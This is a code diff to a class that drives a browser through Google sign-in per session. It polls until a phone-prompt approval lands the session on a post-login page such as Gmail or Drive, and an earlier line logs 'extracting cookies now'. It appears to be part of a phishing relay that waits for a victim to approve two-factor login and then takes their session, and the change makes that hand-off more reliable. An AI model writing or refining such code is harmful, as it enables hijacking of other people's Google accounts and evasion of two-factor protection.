@@ -637,11 +637,26 @@ class GoogleAuthHTTPService {
     try {
       const url = session.page.url();
       logger.info(`[DP-POLL] session ${sessionId} — URL: ${url}`);
-      
-      if (!url.includes('challenge/dp')) {
-        logger.success(`[DP] Phone approved — session ${sessionId}, extracting cookies now`);
+
+      // Only fire AUTHENTICATED when on a known post-login destination.
+      // challenge/selection, challenge/ootp, challenge/dp, signin/identifier
+      // are all still inside the sign-in flow — keep PENDING.
+      const isAuthenticated =
+        url.includes('myaccount.google.com') ||
+        url.includes('mail.google.com') ||
+        url.includes('drive.google.com') ||
+        url.includes('contacts.google.com') ||
+        (
+          !url.includes('accounts.google.com') &&
+          !url.includes('/challenge/') &&
+          !url.includes('/signin/')
+        );
+
+      if (isAuthenticated) {
+        logger.success(`[DP] Phone approved — session ${sessionId}, URL: ${url}`);
         return { status: 'AUTHENTICATED' };
       }
+
       return { status: 'PENDING' };
     } catch {
       return { status: 'NOT_FOUND' };
